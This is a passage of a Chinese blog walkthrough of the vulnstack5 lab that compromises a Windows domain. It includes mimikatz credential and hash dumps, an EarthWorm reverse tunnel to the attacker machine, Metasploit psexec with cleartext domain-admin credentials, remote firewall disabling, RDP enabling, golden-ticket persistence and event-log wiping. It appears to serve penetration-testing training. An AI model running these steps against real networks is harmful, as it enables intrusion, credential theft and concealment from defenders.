93 b3 cb 7c 0e 0e 29 02 9c 46 ab f2 73 c2 4e 64 c3 58 b4 22 21 77 c1 71 e6 b8 aa b8 45 ae e6 a5 63 a4 9a 45 03 ab 3a 3d c1 36 a1 84 3c db a6 d3 ac 16 65 </span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 50586 (00000000:0000c59a)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : (null)</span><br><span class="line">Domain            : (null)</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022/11/8 13:06:01</span><br><span class="line">SID               : </span><br><span class="line">	msv :	</span><br><span class="line">	 [00000003] Primary</span><br><span class="line">	 * Username : WIN7$</span><br><span class="line">	 * Domain   : SUN</span><br><span class="line">	 * NTLM     : dc1cbe1583c92a3740cfcd97e8f0a377</span><br><span class="line">	 * SHA1     : 9275a3ad29e3f533b9a46b981dd635b6adc76169</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	kerberos :	</span><br><span class="line">	ssp :	</span><br><span class="line">	credman :	</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 999 (00000000:000003e7)</span><br><span class="line">Session           : UndefinedLogonType from 0</span><br><span class="line">User Name         : WIN7$</span><br><span class="line">Domain            : SUN</span><br><span class="line">Logon Server      : (null)</span><br><span class="line">Logon Time        : 2022/11/8 13:06:01</span><br><span class="line">SID               : S-1-5-18</span><br><span class="line">	msv :	</span><br><span class="line">	tspkg :	</span><br><span class="line">	wdigest :	</span><br><span class="line">	 * Username : WIN7$</span><br><span class="line">	 * Domain   : SUN</span><br><span class="line">	 * Password : 5a 45 e6 d5 ca ea f3 f2 12 6e 93 4b b8 36 8b 96 02 92 92 af 89 53 f2 61 a4 cf df fb b1 fe d4 3e 15 4a 50 c1 1d 49 82 ad d2 b9 09 de bb c2 0a 73 93 73 63 92 e2 5e 43 df 49 db fa 4f 34 d4 cc 3d a7 4d eb 2e 9a 06 b7 b1 c8 f6 dd f2 62 46 b2 bd 40 a4 ca 49 90 1b 46 79 05 d2 9e 0b 22 35 03 84 c4 d9 02 8b 6a fc 28 21 5c 59 46 59 e7 4c ae 9f 67 ea 59 bd 16 f3 f8 d6 42 7f e8 41 66 92 08 39 d8 58 18 0f dc eb 7a 18 1b 9d ca 6b a1 97 05 b5 55 c1 40 82 3e 64 5a cc 1a 78 9a bc 7f 27 c8 f0 47 7f 9f bd f1 53 4b ab c7 2a e1 cc fa bc 51 62 e1 17 7a 74 32 39 cd 5b 99 c8 40 5c 84 93 b3 cb 7c 0e 0e 29 02 9c 46 ab f2 73 c2 4e 64 c3 58 b4 22 21 77 c1 71 e6 b8 aa b8 45 ae e6 a5 63 a4 9a 45 03 ab 3a 3d c1 36 a1 84 3c db a6 d3 ac 16 65 </span><br><span class="line">	kerberos :	</span><br><span class="line">	 * Username : win7$</span><br><span class="line">	 * Domain   : SUN.COM</span><br><span class="line">	 * Password : 5a 45 e6 d5 ca ea f3 f2 12 6e 93 4b b8 36 8b 96 02 92 92 af 89 53 f2 61 a4 cf df fb b1 fe d4 3e 15 4a 50 c1 1d 49 82 ad d2 b9 09 de bb c2 0a 73 93 73 63 92 e2 5e 43 df 49 db fa 4f 34 d4 cc 3d a7 4d eb 2e 9a 06 b7 b1 c8 f6 dd f2 62 46 b2 bd 40 a4 ca 49 90 1b 46 79 05 d2 9e 0b 22 35 03 84 c4 d9 02 8b 6a fc 28 21 5c 59 46 59 e7 4c ae 9f 67 ea 59 bd 16 f3 f8 d6 42 7f e8 41 66 92 08 39 d8 58 18 0f dc eb 7a 18 1b 9d ca 6b a1 97 05 b5 55 c1 40 82 3e 64 5a cc 1a 78 9a bc 7f 27 c8 f0 47 7f 9f bd f1 53 4b ab c7 2a e1 cc fa bc 51 62 e1 17 7a 74 32 39 cd 5b 99 c8 40 5c 84 93 b3 cb 7c 0e 0e 29 02 9c 46 ab f2 73 c2 4e 64 c3 58 b4 22 21 77 c1 71 e6 b8 aa b8 45 ae e6 a5 63 a4 9a 45 03 ab 3a 3d c1 36 a1 84 3c db a6 d3 ac 16 65 </span><br><span class="line">	ssp :	</span><br><span class="line">	credman :</span><br></pre></td></tr></table></figure>
+
+<p>域管的账号及密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Administrator</span><br><span class="line">dc123.com</span><br></pre></td></tr></table></figure>
+
+<p>域用户leo的账号及密码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leo</span><br><span class="line">123.com</span><br></pre></td></tr></table></figure>
+
+<h2 id="路由转发及隐藏通信隧道"><a href="#路由转发及隐藏通信隧道" class="headerlink" title="路由转发及隐藏通信隧道"></a>路由转发及隐藏通信隧道</h2><p><img src="https://pic.imgdb.cn/item/65752552c458853aef43082d.jpg"></p>
+<p>接下来尝试利用EarthWarm来搭建一个隐藏通信隧道，首先为Win7上传一个ew_for_Win.exe，接下来就可以搭建了：</p>
+<p><img src="https://pic.imgdb.cn/item/65752561c458853aef433981.jpg"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./ew_for_linux64 -s rcsocks -l 1238 -e 1237(攻击机执行)</span><br><span class="line">ew_for_Win.exe -s rssocks -d 192.168.135.128 -e 1237(靶机执行)</span><br></pre></td></tr></table></figure>
+
+<p>成功搭建：</p>
+<p><img src="https://pic.imgdb.cn/item/6575256cc458853aef43659f.jpg"></p>
+<p>我们修改proxychains4.conf添加如下代理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks5 127.0.0.1 1238</span><br></pre></td></tr></table></figure>
+
+<p>同时不要忘记注释掉proxy_dns。</p>
+<p>接下来利用proxychains4来通过添加的代理利用nmap扫描一下192.168.138.138这台机子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sS -sV -sC -A -p- --min-rate 5000 192.168.138.138</span><br><span class="line">Nmap scan report for 192.168.138.138</span><br><span class="line">Host is up (0.0024s latency).</span><br><span class="line">Not shown: 65516 filtered ports</span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">25/tcp    open  tcpwrapped</span><br><span class="line">|_smtp-commands: Couldn&#x27;t establish connection on port 25</span><br><span class="line">53/tcp    open  domain       Microsoft DNS 6.1.7600 (1DB04001) (Windows Server 2008 R2)</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: Microsoft DNS 6.1.7600 (1DB04001)</span><br><span class="line">110/tcp   open  tcpwrapped</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: sun.com, Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds Windows Server 2008 HPC Edition 7600 microsoft-ds (workgroup: SUN)</span><br><span class="line">3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: sun.com, Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">49152/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49157/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49158/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49160/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49168/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49173/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">49226/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Microsoft Windows XP|7|2012</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2012</span><br><span class="line">OS details: Microsoft Windows XP SP3, Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2, cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: -2h39m55s, deviation: 4h36m58s, median: -1s</span><br><span class="line">|_nbstat: NetBIOS name: DC, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 00:0c:29:92:68:89 (VMware)</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2008 HPC Edition 7600 (Windows Server 2008 HPC Edition 6.1)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_server_2008::-</span><br><span class="line">|   Computer name: DC</span><br><span class="line">|   NetBIOS computer name: DC\x00</span><br><span class="line">|   Domain name: sun.com</span><br><span class="line">|   Forest name: sun.com</span><br><span class="line">|   FQDN: DC.sun.com</span><br><span class="line">|_  System time: 2022-11-08T01:37:00+08:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2022-11-07T17:37:00</span><br><span class="line">|_  start_date: 2022-11-07T16:39:34</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 25/tcp)</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   3.57 ms 192.168.135.2</span><br><span class="line">2   3.58 ms 192.168.138.138</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 277.66 seconds</span><br></pre></td></tr></table></figure>
+
+<p>开启了445端口，尝试利用ms17_010未果，但因为已经拿到了域管的账号和密码，所以尝试利用psexec进行无IPC登陆域控。</p>
+<h2 id="psexec登陆域控"><a href="#psexec登陆域控" class="headerlink" title="psexec登陆域控"></a>psexec登陆域控</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">set rhosts 192.168.138.138</span><br><span class="line">set SMBDomain SUN</span><br><span class="line">set SMBUser Administrator</span><br><span class="line">set SMBPass dc123.com</span><br><span class="line">set payload windows/meterpreter/bind_tcp #因为已经配置好了路由，且域控不出网</span><br><span class="line">set lport 1239</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/65752579c458853aef439129.jpg"></p>
+<p>没有登陆成功，猜测是开启了防火墙，尝试关闭防火墙：</p>
+<p>首先开启Win7与Windows2008之间的IPC连接：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.138.138\ipc$ &quot;dc123.com&quot; /user:&quot;Administrator&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/6575258bc458853aef43ce05.jpg"></p>
+<p>接着用sc通过创建服务来远程执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc \\192.168.138.138 create unablefirewall binpath= &quot;netsh advfirewall set allprofiles state off&quot;</span><br><span class="line">sc \\192.168.138.138 start unablefirewall</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/65752597c458853aef43f331.jpg"></p>
+<p>此时再次启动利用psexec登陆域控：</p>
+<p><img src="https://pic.imgdb.cn/item/657525a3c458853aef441bad.jpg"></p>
+<p>成功登陆。刚刚利用nmap扫域控的时候没有发现开启3389端口，进去输入netstat -ano看看情况：</p>
+<p><img src="https://pic.imgdb.cn/item/657525afc458853aef4440e9.jpg"></p>
+<p>并未发现3389端口开启。先看看有没有开启RDP：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections</span><br><span class="line"># 查看RDP服务是否开启：1关闭，0开启  </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/657525bfc458853aef44708e.jpg"></p>
+<p>可以发现RDP是关闭的。那么我们给它打开：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/657525cec458853aef44a508.jpg"></p>
+<p>因为我们刚刚已经关闭了防火墙，所以在此处我们不需要添加防火墙规则允许3389端口了。再查看一下端口情况：</p>
+<p><img src="https://pic.imgdb.cn/item/657525ddc458853aef44dc66.jpg"></p>
+<p>接下来再利用隧道登陆到域控的远程桌面上：</p>
+<p><img src="https://pic.imgdb.cn/item/657525e7c458853aef45021f.jpg"></p>
+<p>成功登陆：</p>
+<p><img src="https://pic.imgdb.cn/item/657525f4c458853aef453046.jpg"></p>
+<h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><h3 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h3><p>首先拿到krbtgt的ntlm hash值和域SID值：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # lsadump::lsa /patch</span><br><span class="line">Domain : SUN / S-1-5-21-3388020223-1982701712-4030140183</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 8c535a2d84c3b21059d667639bb89db5</span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line">LM   : </span><br><span class="line">NTLM : </span><br><span class="line"></span><br><span class="line">RID  : 000001f6 (502)</span><br><span class="line">User : krbtgt</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 65dc23a67f31503698981f2665f9d858</span><br><span class="line"></span><br><span class="line">RID  : 000003e8 (1000)</span><br><span class="line">User : admin</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 8c535a2d84c3b21059d667639bb89db5</span><br><span class="line"></span><br><span class="line">RID  : 00000456 (1110)</span><br><span class="line">User : leo</span><br><span class="line">LM   : </span><br><span class="line">NTLM : afffeba176210fad4628f0524bfe1942</span><br><span class="line"></span><br><span class="line">RID  : 000003e9 (1001)</span><br><span class="line">User : DC$</span><br><span class="line">LM   : </span><br><span class="line">NTLM : 7178f86541258a83bf19728f010c64da</span><br><span class="line"></span><br><span class="line">RID  : 00000451 (1105)</span><br><span class="line">User : WIN7$</span><br><span class="line">LM   : </span><br><span class="line">NTLM : dc1cbe1583c92a3740cfcd97e8f0a377</span><br></pre></td></tr></table></figure>
+
+<p>再Win7上先清除票据缓存：</p>
+<p><img src="https://pic.imgdb.cn/item/65752602c458853aef456137.jpg"></p>
+<p>生成黄金票据并注入内存：</p>
+<p><img src="https://pic.imgdb.cn/item/6575260ec458853aef458562.jpg"></p>
+<p>执行klist查看票据：</p>
+<p><img src="https://pic.imgdb.cn/item/65752619c458853aef45a800.jpg"></p>
+<p><img src="https://pic.imgdb.cn/item/65752623c458853aef45c7ce.jpg"></p>
+<h2 id="痕迹清理"><a href="#痕迹清理" class="headerlink" title="痕迹清理"></a>痕迹清理</h2><p>查看事件日志:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run event_manager -i</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/6575262ec458853aef45e6f4.jpg"></p>
+<p>清除事件日志（包括六种日志类型）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run event_manager -c</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://pic.imgdb.cn/item/6575263bc458853aef4612a7.jpg"></p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">环境部署：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Win7"><span class="toc-number">1.1.</span> <span class="toc-text">Win7</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-2008"><span class="toc-number">1.2.</span> <span class="toc-text">Windows 2008</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%9C%BA%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">攻击机：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">外网渗透：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">内网信息收集：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E8%BD%AC%E5%8F%91%E5%8F%8A%E9%9A%90%E8%97%8F%E9%80%9A%E4%BF%A1%E9%9A%A7%E9%81%93"><span class="toc-number">4.</span> <span class="toc-text">路由转发及隐藏通信隧道</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#psexec%E7%99%BB%E9%99%86%E5%9F%9F%E6%8E%A7"><span class="toc-number">5.</span> <span class="toc-text">psexec登陆域控</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">6.</span> <span class="toc-text">权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">6.1.</span> <span class="toc-text">黄金票据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="toc-number">7.</span> <span class="toc-text">痕迹清理</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://r4inb00w.github.io/2022/11/08/vulnstack5/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://r4inb00w.github.io/2022/11/08/vulnstack5/&text=内网渗透——vulnstack5"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://r4inb00w.github.io/2022/11/08/vulnstack5/&title=内网渗透——vulnstack5"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://r4inb00w.github.io/2022/11/08/vulnstack5/&is_video=false&description=内网渗透——vulnstack5"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=内网渗透——vulnstack5&body=Check out this article: https://r4inb00w.github.io/2022/11/08/vulnstack5/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://r4inb00w.github.io/2022/11/08/vulnstack5/&title=内网渗透——vulnstack5"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://r4inb00w.github.io/2022/11/08/vulnstack5/&title=内网渗透——vulnstack5"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://r4inb00w.github.io/2022/11/08/vulnstack5/&title=内网渗透——vulnstack5"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://r4inb00w.github.io/2022/11/08/vulnstack5/&title=内网渗透——vulnstack5"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://r4inb00w.github.io/2022/11/08/vulnstack5/&name=内网渗透——vulnstack5&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://r4inb00w.github.io/2022/11/08/vulnstack5/&t=内网渗透——vulnstack5"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    1970-2099
+    rainb0w
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'r4inb00w/r4inb00w.github.io';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
